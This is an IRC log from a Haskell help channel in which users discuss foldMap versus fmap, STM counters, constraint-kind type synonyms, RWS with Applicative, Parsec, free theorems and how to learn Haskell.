07:35:25 <applicative> poppingtonic: so 'cabal install regex-compat'
07:35:27 <bscarlet> b2coutts: foldMap is not a more general map
07:36:01 <poppingtonic> It returns /var/lib/ghc/package.conf.d
07:36:43 <applicative> poppingtonic: right, that's the place it looked, if regex-compat isnt listed, it's not there
07:36:53 <mike-burns> b2coutts: It's a more general fold, that works over anything that's foldable and a function that goes from a to a monoid. So, like, `foldMap Sum [1,2]'. That's my understanding at least.
07:37:44 <applicative> so it looks like you need cabal install regex-compat ; i'm not really familiar with the myriad regex libraries, so there may be  a subtlety ahead....
07:37:56 <poppingtonic> applicative: I just did a cabal install, currently ongoing. Much thanks.
07:38:04 <b2coutts> mike-burns: yeah, I got confused for a second
07:38:08 <donri> :t \f -> foldMap ((:[]) . f)
07:38:09 <mike-burns> b2coutts: And since `map' can be defined in terms of `foldr', and `foldr' in terms of `foldMap', there must be a way to define `map' directly in terms of `foldMap'. Like, some newtype I can define that I can call ListMapper (or even just Mapper) that implements the Monoid methods just right.
07:38:10 <lambdabot> Foldable t => (a -> b) -> t a -> [b]
07:38:23 <mike-burns> Aha. I needed the monkey-face operator.
07:38:23 <poppingtonic> applicative: It compiled and installed clean. No problems.
07:38:28 <b2coutts> so what foldMap does is map a function over everything in your datastructure, so that everything becomes a monoid
07:38:50 <b2coutts> and then concatenates these monoids
07:39:08 <poppingtonic> And the import is good. Yipee.
07:39:33 <b2coutts> so to write map with foldMap, you need to use the mapping part to map your function over the elements of the list, and make sure the concat part folds them all together
07:39:45 <lpaste> valyagolev pasted “ No instance for...” at http://lpaste.net/3162731844244340736
07:39:50 <valyagolev> ^^ :(
07:40:04 <b2coutts> so you can do this by making a singleton list with the function
07:40:22 <lpaste> valyagolev revised “ No instance for...”: “No title” at http://lpaste.net/3162731844244340736
07:40:24 <mike-burns> I see now.
07:40:25 <b2coutts> @let mymap f lst = foldMap (([]) . f) lst
07:40:26 <lambdabot>  .L.hs:148:25:
07:40:26 <lambdabot>      Couldn't match expected type `b0 -> m0' with actual type ...
07:40:37 <mike-burns> Thanks for walking me through that, b2coutts .
07:40:49 <valyagolev> well, the second error is something I can't fix :/
07:40:56 <donri> mike-burns: that doesn't preserve the foldable structure though. i think you may need Traversable to generalize map ...
07:41:00 <b2coutts> @let mymap f lst = foldMap (singleton . f) lst
07:41:01 <lambdabot>  .L.hs:148:24:
07:41:01 <lambdabot>      Not in scope: `singleton'
07:41:01 <lambdabot>      Perhaps you meant one of t...
07:41:08 <b2coutts> >_>
07:41:19 <b2coutts> @let mymap f lst = foldMap ((:[]) . f) lst
07:41:20 <lambdabot>  Defined.
07:41:26 <b2coutts> mymap (+5) [1..10]
07:41:33 <b2coutts> > mymap (+5) [1..10]
07:41:37 <lambdabot>   [6,7,8,9,10,11,12,13,14,15]
07:41:48 <donri> mike-burns: well, functor is the generalization of map ...
07:42:07 <donri> :t fmapDefault
07:42:08 <lambdabot>     Not in scope: `fmapDefault'
07:42:08 <lambdabot>     Perhaps you meant `T.fmapDefault' (imported from Data.Traversable)
07:42:11 <donri> :t T.fmapDefault
07:42:12 <lambdabot> Traversable t => (a -> b) -> t a -> t b
07:42:12 <b2coutts> @src foldMap
07:42:13 <lambdabot> Source not found. Your mind just hasn't been the same since the electro-shock, has it?
07:42:21 <donri> @src fmapDefault
07:42:21 <lambdabot> Source not found. Do you think like you type?
07:42:24 <b2coutts> @src Data.Foldable.foldMap
07:42:24 <lambdabot> Source not found. I've seen penguins that can type better than that.
07:42:45 <b2coutts> well anyway, the above mymap definition proves that you can define map using foldMap
07:42:50 <mike-burns> Yes.
07:42:58 <mike-burns> Now I'm interested in fmapDefault.
07:43:09 <mike-burns> Off to red about it. Thanks b2coutts and donri .
07:43:13 <mike-burns> *read
07:43:30 <donri> b2coutts: yes but it turns it into a list
07:43:50 <mike-burns> Right, I'd like to preserve the structure of whatever `t a' is.
07:43:52 <b2coutts> donri: that's what we're trying to implement right?
07:43:58 <b2coutts> map?
07:44:06 <donri> b2coutts: not sure :) really, mike-burns just wants Functor
07:44:07 <b2coutts> ah
07:44:09 <b2coutts> fmap I guess
07:45:02 <donri> mike-burns: you need Traversable to generalize map, but it's pointless because you need Functor to have a Traversable
07:45:26 <mike-burns> Ah well.
07:46:44 <donri> i suppose it might be doable with (Pointed,Monoid)... :p
07:47:29 <donri> :t \f -> foldMap (pure . f)
07:47:30 <lambdabot> (Applicative f, Foldable t, Monoid (f b)) => (a -> b) -> t a -> f b
07:48:18 <b2coutts> is it possible in general to write id using foldr?
07:48:30 <b2coutts> I feel like it isn't
07:49:02 <b2coutts> in which case, writing fmap with foldMap probably wouldn't be possible, since you need a way of making the fold do nothing
07:49:04 <shachaf> It is not.
07:50:43 <mike-burns> Well `fmap' can have some typeclass constraints on the argument, unlike `id'.
07:52:09 <mike-burns> Thanks again, time to run.
07:52:09 <shachaf> Hey, mike-burns is alive.
07:52:10 <donri> :t (\f -> foldMap (pure . f)) (+1) `asAppliedTo` Just 1
07:52:11 <lambdabot> (Num b, Applicative f, Monoid (f b)) => Maybe b -> f b
07:52:13 <mike-burns> shachaf: Hi!
07:52:31 <mike-burns> I disappeared for, like, two years. Didn't expect anyone to recognize me.
07:52:59 <shachaf> We met approximately two years ago in Boston.
07:53:13 <mike-burns> We sure did, just before I moved.
07:53:25 <divyansr> :i Logic
07:54:30 <red__> what language does abelson/sussman use?
07:55:04 <red__> by "use" .. i mean for examples
07:55:07 <quchen> Scheme.
07:55:33 <red__> thanks
07:57:16 <quchen> The usual name for the book is SICP, by the way.
07:58:11 <mm_freak> FunctionalDependencies implies MultiParamTypeClasses?
07:58:23 <donri> Silly Interpretation of Capitalized Pseudonyms
07:58:37 <quchen> SIOCP?
07:58:47 <donri> of wasn't capitalized!
07:59:09 <donri> SaIoCP? :p
07:59:32 <quchen> LYAHFGG wins this one no matter what
08:02:29 * hackagebot google-search 0.0.1.0 - EDSL for Google and GMail search expressions  http://hackage.haskell.org/package/google-search-0.0.1.0 (LiyangHu)
08:04:16 <donri> Long Yawn-inducing Acronym Has Finally Gotten Gibberish
08:08:29 <quchen> You should work for the US government for naming things. Like the PATRIOT act and SALT and PRISM and stuff.
08:12:04 <ibotty> http://lpaste.net/92284
08:12:05 <ibotty> can someone comment on why the code does not work? the stm transaction alone does work and increments nextSerial, but the io action mkRobot always returns the same serial number. ideas?
08:12:27 <ibotty> hpaste 92284
08:13:40 <quchen> ibotty: `tvar` is always initialized using `minBound`.
08:13:53 <quchen> You then increase that one and return the old value.
08:14:01 <quchen> When you call your function again, it'll do just that again.
08:14:29 <quchen> Basically, `nextSerial` does nothing "next", it just initializes the same thing every time.
08:14:44 <ibotty> awww
08:14:45 <haasn> (it would be okay to use unsafePerformIO here right?)
08:14:50 <quchen> No.
08:14:57 <quchen> Boo.
08:15:11 <haasn> isn't that the reason newTVarIO exists :P
08:16:40 <donri> quchen: like the Currency Optimization, Innovation and National Savings (COINS) Act
08:16:58 <haasn> line 15 could be concatMap show [c,c'] ++ concatMap show [d,d',d''] :)
08:16:59 <quchen> donri: Make me a QUCHEN :-D
08:17:19 <ibotty> hmm i kind of understand
08:17:34 <ibotty> so how do i get that as global counter?
08:17:57 <quchen> ibotty: If you want mkRobot *update* a TVar, you'll have to provide it beforehand, not create one in the same function.
08:18:03 <haasn> ibotty: re-use the same TVar (Serial Robot)
08:18:39 <haasn> ps. you might want an MVar instead, doesn't look like you're doing concurrency :)
08:18:40 <ibotty> haasn: that's longer though...
08:18:41 <quchen> so "main = do tvar <- newTVarIO minBound; mkRobot tvar; ..."
08:18:46 <haasn> pps. you might just want StateT (Serial Robot) IO
08:19:08 <ibotty> unfortunately the api is fixed
08:19:18 <ibotty> it's an exercise for exercism.io
08:20:12 <ibotty> and i guess it might be used concurrently (not in that example though)
08:20:17 <ibotty> well.
08:20:31 <donri> quchen: quickly update concurrent happenings ending nothing? eeeh
08:21:13 <haasn> MVar works fine with concurrency, especially here :P
08:21:59 <ibotty> okay... another thing, same paste: can't i derive the enum instance?
08:22:04 <ibotty> :D
08:22:38 <ibotty> serial is a sum type of bounded enums, shouldn't that somehow suffice?
08:23:01 <ibotty> i mean, mathematically it is clear that that should work.
08:23:09 <haasn> yeah but ghc doesn't derive them that way
08:24:06 <haasn> it's a bit hard to handle roll-over too, you have to check for ‘x == maxBound’ otherwise succ x will be an error
08:25:08 <haasn> and toEnum/fromEnum are weird either way :D
08:25:30 <haasn> Enum/Bounded are a bit too inconsistent and imprecisely defined to be much use in reasoning about these sort of things
08:25:40 <ibotty> but the standard derived from/toEnum's don't roll-over either
08:26:46 <danilo2> Hi! I've got long type signature (used in many functions). Is it possible to create new type with short name, which I will use instead of this signature?: "genModule :: (Enum a, MonadState a m, MonadWriter [LogEntry.LogEntry] m) => LAST.Expr -> MaybeT m ()"
08:28:54 <applicative> danilo2: you can make synonyms for the constraints now, if thats what you mean
08:29:37 <pentace> Can't you use simple type synonyms for that?
08:29:59 <cschneid> as a newbie, I'd be interested in seeing that in action - how to simplify the constraints part
08:31:10 <cschneid> I know how to do something like `type String = [Char]` to alias types, but does that extend simply to constraints?
08:31:53 <lingxiao> hey all, can I ask a question about how to approach programming in haskell in general?
08:32:25 <shachaf> cschneid: If you have the GHC extension ConstraintKinds.
08:32:26 <applicative> like so cschneid http://sprunge.us/LTWB
08:32:41 <cschneid> ahh sweet. Thank you both
08:32:47 <deggis> lingxiao: use good tutorials (but don't touch most of the monad tutorials, keep away :D) and when in doubt: don't guess!
08:33:08 <deggis> learnyouahaskell counts as a good starting point
08:33:24 <lingxiao> deggis: haha thanks! unfortunately I've exhausted most of the tutorials, including the non-helpful ones...
08:33:24 <cschneid> lingxiao: I'm fairly new. Do a few of the super-simple fib function type deals to understand the basics, then just dive into a problem you find interesting.
08:33:49 <cschneid> lingxiao: reading through LYAH and RealWorldHaskell is super helpful to grok some ideas, but only when you also run into them
08:33:57 <lingxiao> lately I've been spending a lot more time thinking about to to compose programs at the type level, without really thinking too much about implementation
08:34:11 <absence> is there a library with something similar to an applicative version of zipWith (i.e. (a -> b -> c) -> [f a] -> [f b] -> [f c])?
08:34:15 <deggis> lingxiao: that's a good way to understand things imo
08:34:56 <ParahSailin> @hoogle ZipList
08:34:56 <lambdabot> Control.Applicative ZipList :: [a] -> ZipList a
08:34:56 <lambdabot> Control.Applicative newtype ZipList a
08:34:56 <lambdabot> Control.Applicative getZipList :: ZipList a -> [a]
08:35:07 <lingxiao> deggis: yeah the problem is that I feel like I've moved to a different domain again, and I'm just hacking away at the types without real intuitive picture of what's going on
08:35:34 <lingxiao> kind of like hacking away at some basic recursive function in a freshman cs course
08:36:10 <danilo2> applicative: Ok this partuialy solves my problem, but Can I make synonims to contraints and signatures together? like: type Moo a = (Enum a, Ord a) => a -> a -> Bool  ?
08:36:37 <yitz> lingxiao: what can you already do and what do you want to be able to do?
08:36:42 <lingxiao> cschneid: thanks for the response! :)
08:36:49 <absence> ParahSailin: aren't ZipLists a generalisation of zipWith that takes any number of lists?
08:37:07 <cschneid> lingxiao: so I started doing some bit manipulation with encryption problems, and now am diving into the snap web framework. It's way over my head, but it's coming together.
08:37:09 <lingxiao> yitz: Im recreating a coroutine package, while studying through machines and pipes
08:37:14 <cschneid> lingxiao: it's good motivation to see things actually working.
08:37:21 <lingxiao> and have gone through that coroutine article in monad reader
08:37:43 <ParahSailin> :ty liftA2
08:37:51 <yitz> lingxiao: have you written just regular programs, that do things?
08:38:07 <lingxiao> yitz: what's a regular program?
08:38:07 <ParahSailin> @ty liftA2
08:38:08 <lambdabot> Applicative f => (a -> b -> c) -> f a -> f b -> f c
08:38:12 <deggis> lingxiao: oh so if you are doing that stuff it seems that my previous advice was aimed for a little more beginner than you :)
08:38:33 <absence> ahaaa
08:38:39 <absence> @ty zipWith . liftA2
08:38:40 <lambdabot> Applicative f => (a -> b -> c) -> [f a] -> [f b] -> [f c]
08:38:55 <lingxiao> deggis: yeah.. I feel like a noob on most days. And when it comes to "sheer creation by moving around types in my head", I'm basically a total noob
08:39:24 <applicative> danilo2: yes, that doesn't require ConstraintKinds, just type Goo a = (Enum a, Ord a) => a -> a -> Bool
08:39:30 <yitz> lingxiao: well, something that a user can run and so something with. not just a part of a library that implements some theoretical framework that can be used to implement other libraries.
08:39:35 <lingxiao> deggist: not sure if you understand what I'm trying to say, it's like a qualia of being free and understanding the domain so well you can just walk around it in your head
08:39:38 <lingxiao> so that's not me
08:39:42 <applicative> moo :: Goo a ; moo a b = succ a > b
08:39:43 <yitz> *do something with
08:39:43 <absence> out of curiosity, can that be extended to N lists too? ZipZipList :)
08:39:51 <deggis> lingxiao: then implement something :) pick (small) challenges, implement them and then rewrite them after you see what went wrong in the first attempt
08:40:18 <applicative> danilo2: I was somehow thinking it was just the constraint that was your tiresome boilerplate
08:40:28 <lingxiao> cschneid: yeah I totally agree, that's why I like programming over lab work I guess, the feed back is quicker hehe :)
08:40:29 <deggis> lingxiao: i guess i wasn't following your idea though
08:40:53 <ParahSailin> absence: well, you can either use liftAN and zipWithN
08:40:56 <danilo2> applicative: Ah my type declaration was missing the type variables. Ok thank you - the idea with ConstraintKinds is very nice also - thank you :)
08:41:03 <lingxiao> deggis: like I'm all for writing tons of code and to an extent, bang at it until it works, at least in the beginning, because I think volume does matter
08:41:27 <lingxiao> but if there's a more efficient, or smarter way to learn -- how to think in types -- it'd be great
08:41:40 <lingxiao> i put it in "--" because it's really important
08:41:50 <cschneid> lingxiao: what I've found is that the haskell community is super freaking helpful. This channel & the mailing lists are pretty handy.
08:41:53 <Iceland_jack> lingxiao: I assumed it was a comment
08:42:05 <deggis> lingxiao: okay. i fear that while i now grasp what you are thinking, i don't have any advice now
08:42:23 <lpaste> danilo2 pasted “Problem with type declarations” at http://lpaste.net/92285
08:42:43 <lingxiao> yitz: well I wrote a transducer that parses sentences and tag part of speech
08:42:44 <danilo2> applicative: I've got a problem making such types - could you look at this? : http://lpaste.net/92285
08:42:59 <lingxiao> but nothing bigger than that, def have not played with yesod or something like that
08:43:12 <lingxiao> deggis: yeah I guess it's a personal path, and it's hard to give advice on it
08:43:23 <cschneid> lingxiao: I imagine it's like any other language - where intuition is gained by writing & reading code.
08:43:39 <cschneid> unless you're a super-strict mathy person who wants to read a ton of papers and go at it that way....
08:44:00 <lingxiao> Iceland_jack: what was a comment?
08:44:24 <lingxiao> cschneid: yeah people here and SO are surprisingly helpful, even those who are like really really good
08:45:03 <lingxiao> cschneid: so someone who is really good at it said to me "don't skip the math, the abstraction is there to help you and make things easier"
08:45:13 <lingxiao> so I've been folllwing that advice I suppose
08:45:45 <cschneid> lingxiao: well, don't pretend it doesn't exist, but you can write useful code without quite groking the math. Then when you run into a problem, and the math provides an answer, you see the `why` behind it.
08:46:00 <cschneid> and that links it to the knowledge you have, as opposed to being free floating "ohh that's cool" islands of knowledge
08:48:37 <lingxiao> cschneid: that's the thing though, I don't know how much background info would help in a certain situation..
08:49:01 <lingxiao> like if I want to write some function `f :: monad m => m a -> forall r. m r`
08:49:36 <lingxiao> if had some background knowlegdge, I'd know that this might  not be possible without destroying the information in the original monad `m`
08:50:10 <lingxiao> like if I write a signature like that, how am I suppose to have an intutive sense of whether it makes sense in any domain?
08:50:11 <cschneid> don't let your lack of knowledge freeze you from writing code :) I do get where you're coming from though. This is certainly the most formal language I've worked in
08:51:05 <lingxiao> i write tons of code, but lately it's all coming from the same pool of knowlege, which is not getting bigger like before. this is subpar
08:52:05 <dfan> Yay Hoogle
08:52:21 <dfan> I figured there must be a (a -> Maybe b) -> [a] -> [b] and sure enough
08:53:11 <cschneid> lingxiao: then sounds like code reading is the next step. Pop open some libraries of whatever complexity, and get about completely understanding them
08:53:17 <lingxiao> cschneid: out of curiosity, how long (doesn't have to measured in days or month) have you been learning haskell and what gave you the greatest trouble?
08:53:23 <yitz> lingxiao: try writing stuff using lenses. that will get you thinking about types.
08:53:38 <lingxiao> yeah I'm reading through some of ekmett's stuff, and it's a great exprerience
08:53:57 <lingxiao> yitz: what are some good stuff to write that'll give me good coverage?
08:54:05 <cschneid> lingxiao: off and on for a long time, then for the last month in off-hours. Working mostly with snap. It sounds like you have more experience than I do on types and haskell, so I'm speaking from a more general "how to learn" point of view
08:54:18 <lingxiao> like I used it once as simple acessors and modifiers, which is kind of scratching the surface
08:54:59 <yitz> lingxiao: right, that's where lenses originally started
08:55:58 <cschneid> lingxiao: I've wanted to make an app for the ipad which has nice syntax higlighted code on 2/3 of the screen, and annotations on the right by a programmer who's familiar. Then maybe an audio walkthrough of: "so this is cool, and affects what we did over here...."
08:56:09 <cschneid> like the audio tours you get in museums.
08:56:20 <cschneid> (anybody, feel free to steal this idea. It's great)
08:56:36 <lingxiao> cschneid: dude that's a great idea!
08:56:43 <lingxiao> it's like those shakespear books, but live
08:56:55 <yitz> lingxiao: now it does a lot more, like traversals that only apply to elements that match certain criteria, etc.
08:58:07 <lingxiao> yitz: do you remember what was the biggest difference you felt while writing haskell after groking lenses?
08:58:29 <lingxiao> and how it work? I suppose you said it'll help me thnk about types more, likehow so?
08:58:47 <yitz> lingxiao: or get involved in a project. pick your favorite part of the haskell ecosystem that you wish were improved - and improve it
09:00:15 <yitz> lingxiao: i personally don't use lenses so much. i write haskell in a commercial environment. i don't want "grokking lenses" to be a requirement for members of my team to support the code i write.
09:01:02 <yitz> lingxiao: but i think they're really cool. and i think edwardk's creative and inspired use of types is what drives them.
09:02:03 <lingxiao> yitz: see that's exactly what I'm talking about, "creative and inspired use of types" <-- where I want to be
09:02:14 <lingxiao> create with types
09:02:24 <yitz> lingxiao: right, that's what made me suggest lenses to you :)
09:02:33 <lingxiao> oh hahaa :D
09:03:20 <lingxiao> btw can I ask you what it is like writing haskell in commerical environment? the kind of constraints it puts on the development process, and kind of engineers hired?
09:03:40 <lingxiao> it's ok if you don't feel like asnwering since it might be a long answer
09:03:52 <cschneid> yitz: seconding that question - it is interesting because other languages do similar too: "Don't monkeypatch in ruby for instance"
09:04:27 <lingxiao> benefits relative to python and java, ect
09:04:55 <lingxiao> and the kind of problems best solved by haskell vs. pythong, java
09:05:14 <absence> ParahSailin: yes, there's probably not a readymade solution for both at the same time
09:07:22 <yitz> lingxiao: from the language point of view - the main advantage is that types make it easier to create better quality software (i.e. less bugs) faster
09:08:31 <lingxiao> do you find that you have to recreate a lot of packages that are present in other langauges? Is that offset by things like speed, knowlege of the entire codebase, what about maintainence, a person leaving
09:09:29 <yitz> lingxiao: hiring engineers - we are a telecommuting company, so in theory there are plenty of engineers to hire. in practice, lately we have been focusing on getting more of our existing team into haskell.
09:09:59 <lingxiao> hmm.. how long was the ramp up time, on average
09:10:06 <yitz> lingxiao: haskell has a pretty robust set of libraries these days.
09:10:35 <danilo2> Hi! I've got a function (genModule :: (Enum a, MonadState a m, MonadWriter [LogEntry.LogEntry] m) => LAST.Expr -> MaybeT m Module) and it is used as follows: runRWS (runMaybeT (Gen.genModule ast)) 0 0 - is it possible to somehow add here the Applicative style? I want simply to convert do blocks to applicative functions
09:10:37 <lingxiao> ah, are there any problem areas where Haskell is def weaker compared to java or python?
09:10:54 <lingxiao> sorry.... a volley of questions I'm hurling at you :|
09:11:26 <lingxiao> like not the language java or python, but the quality/availablity of packages
09:12:30 <yitz> lingxiao: not sure about the ramp up time. they don't focus on learning haskell all day - they have plenty of other things to do. so it's hard to measure.
09:13:26 <yitz> lingxiao: yes. well, obviously there's less altogether. but so far there has always been some good quality package we could use for everything we have needed so far.
09:13:48 <danilo2> Is it possible in haskell to combine RWST with Applicative style somehow?
09:13:50 <cschneid> yitz: what domain do you work in?
09:13:52 <yitz> lingxiao: a lot of our stuff is based on yesod and conduit. that's a very rich ecosystem.
09:14:01 <cschneid> web stuff, cool.
09:14:09 <yitz> cschneid: enterprise documentation, xml/sgml
09:14:37 <yitz> danilo2: sure why not, RWST is Applicative.
09:16:07 <lingxiao> yitz: ahh conduit, awesome! may I ask you a question about something having to do with coroutine I'm trying to impleemnt,and if it make sense to you?
09:16:17 <lingxiao> since they're like somewhat related
09:18:05 <lpaste> danilo2 pasted “RWS + Applicative” at http://lpaste.net/92286
09:18:17 <Eduard_Munteanu> What's a good way to get Parsec to return Nothing on any failure for a given parser?
09:18:20 <danilo2> yitz: could you please look at this error I'm getting: http://lpaste.net/92286
09:18:36 <Eduard_Munteanu> optionMaybe only returns Nothing if the parser fails without consuming any input.
09:18:52 <Eduard_Munteanu> Should I do optionMaybe . try ?
09:19:39 <danilo2> Eduard_Munteanu: have you tried "fail"? What does mean "on any failure" ?
09:20:41 <Eduard_Munteanu> danilo2: I'm parsing some strings and I want to ignore the unknown ones
09:22:22 <danilo2> Eduard_Munteanu: so make something like pStringParser = many(try pString <|> return "")
09:22:37 * hackagebot henet 1.3.9.0 - Bindings and high level interface for to ENet v1.3.8  http://hackage.haskell.org/package/henet-1.3.9.0 (JohnEricson)
09:23:07 <danilo2> Does anybody know why RWS + Applicative (like this one) does not work? : http://lpaste.net/92286
09:23:40 <joelteon> How do I figure out why Haddock function nane hyperlinks aren't created?
09:23:43 <joelteon> name*
09:26:40 <Eduard_Munteanu> danilo2: give it a type signature
09:27:37 * hackagebot ghc-parmake 0.1.6 - A parallel wrapper for 'ghc --make'.  http://hackage.haskell.org/package/ghc-parmake-0.1.6 (MikhailGlushenkov)
09:30:02 <danilo2> Eduard_Munteanu: Thanks - I've got type signature, but I simply forget to tell that m is a Functor! thank you :)
09:32:13 <lpaste> danilo2 pasted “Not working type declaration” at http://lpaste.net/92287
09:32:39 <danilo2> Heh - I've got yet another question - Why such type declaration does not compile? Is it possible to even somehow make such type declarations? : http://lpaste.net/92287
09:32:58 <yitz> lingxiao: there is coroutine stuff under the hood, but at the user level conduits is very simple - just connect an input to an output.
09:33:40 <lingxiao> yeah just noticed that looking at the source..
09:34:31 <lingxiao> in your opinion, does it make sense to turn any monad into a conduit by wrapping it? ie, `StateT a (conduit ...) b` ?
09:34:53 <lingxiao> then you can connect it to other conduits somehow...
09:34:55 <applicative> danilo2: the problem is that a doesn't appear outside the constraint
09:35:14 <danilo2> applicative: So how can i do this?
09:35:56 <haasn> applicative: I thought the problem is the constraint
09:36:06 <lingxiao> but then you cant connnect it like `stateConduit $= conduit`
09:36:11 <haasn> oh, nvm
09:36:15 <haasn> type Foo a = () => a -- works
09:36:23 <applicative> yes, that's what i was saying haasn
09:36:24 <lingxiao> it has to be like ... `hoist (\conduit -> conduit $= sink) stateConduit
09:36:29 <lingxiao> if it type checks
09:36:41 <lingxiao> `hoist (\conduit -> conduit $= sink) stateConduit`
09:36:46 <applicative> similarly if he had ... => a -> LAST.Expr -> MaybeT m r wouldn't it work?
09:37:29 <saml> f :: a -> Bool;    f "x" == f "x"  is always true, right?
09:37:38 * hackagebot henet 1.3.9.1 - Bindings and high level interface for to ENet v1.3.9  http://hackage.haskell.org/package/henet-1.3.9.1 (JohnEricson)
09:37:55 <saml> yah unless f changes depends on environment (environment is argument)
09:38:01 <quchen> saml: Unless f "x" is bottom.
09:38:08 <saml> that, too
09:38:36 <quchen> Then that is always true, for reasonable implementations of (==).
09:38:48 <applicative> danilo2: does something go wrong if you strike Enum a and MonadState a m from the constraint? Its hard to see what they could be doing
09:38:49 <quchen> You can of course set "a == b = False".
09:39:04 <monochrom> because f :: ... -> Bool, you will be using Bool's ==
09:39:10 <quchen> Oh right.
09:39:44 <danilo2> applicative: I've got exactly the same error then :(
09:40:20 * haasn .oO( {-# LANGUAGE ConstraintKinds #-} type Generator a m = (Functor m, Enum a, MonadState a m, ...) )
09:40:26 <monochrom> the more interesting aspect is f"x" == f"y", if non-bottom
09:40:34 <haasn> Generator m => Expr -> MaybeT m r
09:41:28 <yitz> lingxiao: what would you want such a conduit source to do?
09:42:24 <lingxiao> so within `conduitState`, i can have something like `get >>= \x -> (lift . yield $ x)`
09:42:46 <applicative> danilo2: this passes inspection: type Generator a m r = (Functor m, Enum a, MonadState a m, MonadWriter [Int] m) =>  MaybeT m r
09:43:14 <lingxiao> and within `sink`, I can have something like `await >>= \x -> return $ x + x`
09:43:29 <donri> applicative: don't you still need Rank[2N]Types ?
09:43:41 <applicative> FlexibleInstances
09:43:59 <lingxiao> the reason it's StateT (conduit), not ConduitT (State) is if I have some function that composes state monads,
09:44:07 <yitz> lingxiao: so it is a source that just emits one thing - the state - once?
09:44:11 <danilo2> applicative: with your newest code I'm still getting: Illegal polymorphic or qualified type:       (Functor m, Enum a, MonadState a m, MonadWriter [Int] m) =>       MaybeT m r
09:44:26 <applicative> FlexibleContexts rather
09:44:27 <lpaste> danilo2 pasted “example ” at http://lpaste.net/92288
09:44:32 <lingxiao> `StateT a m b -> StateT a m b -> StateT a m b`, I can compose StateT(conduit) with this function
09:44:39 <danilo2> applicative: I'm using it like that: http://lpaste.net/92288
09:45:03 <danilo2> applicative - I've tried flexibleContexts
09:45:11 <lingxiao> the logic provided is like a throwaway example and is admittanly contrived, I guess in my mind
09:45:51 <lingxiao> I find coroutines a good way to write discrete pieces of logic that does certain things, and it'd be great if any monad can wrap some coroutine
09:46:22 <lingxiao> and such monad does not have to compose using conduit combinators, but rather their own
09:46:59 <applicative> http://sprunge.us/jYad
09:47:09 <applicative> this works danilo2 ^^^
09:48:13 <applicative> wait a minute danilo2 i might be under the .ghci illusion....
09:49:12 <applicative> danilo2: yes, i was using RankNTypes on the sly
09:49:29 <monochrom> .ghci is like numCapabilities :: Int
09:50:23 <danilo2> applicative: ahhh you;re using rankNTypes? But I think they decrease the performance and they are dangerous - am I wrong?
09:50:42 <monochrom> how do you know?
09:51:24 <danilo2> I heard something like that a time ago ... But I'm not sure if its right
09:52:38 * hackagebot henet 1.3.9.2 - Bindings and high level interface for to ENet v1.3.9  http://hackage.haskell.org/package/henet-1.3.9.2 (JohnEricson)
09:52:57 <applicative> danilo2: i don't think they're anything to be afraid of; but the fact the we don't understand what type we really want here is something to be afraid of ;)
09:53:17 <danilo2> applicative: Ok, thank you :)
09:53:35 <applicative> the lens and pipes libraries are wall-to-wall RankNTypes
09:53:51 <monochrom> my answer is no. but the more interesting point (IMO) is: when you heard that, did you ask, "how do you know?"?
09:54:10 <monochrom> that is, IMO people accept hearsay too easily
09:57:00 <quicksilver> even rankntypes are erased at compile time
09:57:08 <quicksilver> in themselves they have no performance effect at all.
09:57:45 <quicksilver> it is true that certain complex abstraction patterns - especially cross-module - move you away from the sweet spot of the GHC optimiser of course
09:58:10 <quicksilver> on the other hand, libraries like lens are written by people who understand the GHC optimiser pretty well and spent qutie a lot of time thinking about the performance of their abstractions.
10:03:50 <joelteon> is it possible to make a class derivable?
10:04:24 <applicative> if it is a newtype, yes; but i suppose you know that
10:04:40 <joelteon> heh
10:04:40 <mauke> newtypes aren't classes
10:04:59 <applicative> now, but what is derived is the types falling under the class
10:05:20 <mauke> you've lost me
10:05:35 <LazinCajun> I'm trying to understand how Functors can be uniquely derived, and I found this discussion: http://article.gmane.org/gmane.comp.lang.haskell.libraries/15384 There is a claim for any function foo :: (Functor f) => (a->b) -> f a -> f b, it follows from "the free theorem for foo" that foo (g . f) = fmap g . foo f, with f and g having appropriate type signatures.  What is this "free theorem for foo?"  The
10:05:37 <LazinCajun> statement isn't immediately obvious to me and I can't find anything else on it
10:05:52 <applicative> i understood joelton to be saying, can i do something so that my class is such that later someone can write
10:06:01 <applicative> deriving (Ord, Joelton)
10:06:04 <donri> joelteon: not currently with the "deriving" clause, but you can use generics to derive the body of an instance declaration
10:06:27 <joelteon> well I confess that I want to make Arbitrary derivable
10:06:32 <donri> deriving (Ord, Generic); instance Joelton Thing
10:06:43 <LazinCajun> s/Functors can be uniquely derived/functor instances can be uniquely derived
10:06:49 <joelteon> because all my instances look like Datatype <$> arbitrary <*> arbitrary <*> ...
10:06:53 <donri> joelteon: there's a branch on github for that, not sure why they never merge it
10:06:57 <joelteon> ok
10:08:17 <applicative> LazinCajun: is it the concept of a free theorem thats mysterious; or this case?
10:08:56 <LazinCajun> applicative: actually, both.
10:09:14 <donri> joelteon: maybe you could simplify it with Traversable though, which you can derive with DeriveTraversable
10:09:23 <joelteon> oh, neat
10:10:36 <valyagolev> joelteon: http://www.cs.uu.nl/wiki/bin/view/GenericProgramming/SYB
10:10:46 <donri> joelteon: actually uhm, scratch that i think :D
10:10:51 <joelteon> :(
10:11:14 <applicative> LazinCajun: here as elsewhere, there is nothing in the world more lucid than Wadler's original explanation http://homepages.inf.ed.ac.uk/wadler/topics/parametricity.html
10:11:40 <donri> joelteon: ...or you could try smallcheck instead, which has generics support on hackage
10:11:53 <LazinCajun> applicative: thanks, will check it out!
10:12:05 <donri> joelteon: http://hackage.haskell.org/packages/archive/smallcheck/1.0.4/doc/html/Test-SmallCheck-Series.html#g:1
10:16:52 <applicative> LazinCajun: I think Wadler's reasoning about map on p.7 sec 3.5 should carry over; but im not sure yet
10:17:11 <edwardk> joelteon: sort of. what you can do is try to define default signature versions of its methods using something like GHC.Generics, then make the class defineable with no body by using default signatures to go to the generic version of the class
10:17:24 <edwardk> joelteon; so it isn't then derivable but its just 'instance Hashable Foo'  to add it
10:17:36 <joelteon> I see
10:17:46 <applicative> "suppose that I tell you I am thinking of a function m :: (a -> b) -> f a -> f b; you will immediately guess that I am thinking of the fmap function ...
10:18:23 <edwardk> joelteon: example: http://hackage.haskell.org/packages/archive/bytes/0.11/doc/html/src/Data-Bytes-Serial.html#Serial see GSerialize  in there and compare it to Serialize.
10:18:32 <edwardk> then you can see a bunch of instances that abuse the generic version
10:20:19 <LazinCajun> applicative: yep, that would do it.  Thanks again.  This channel is always so helpful :)
10:21:58 <mcstar> i just learned about GADTs, and what i just learned is already deprecated :( (syntax wise)
10:21:58 <donri> joelteon: maybe relevant http://hackage.haskell.org/package/Agata
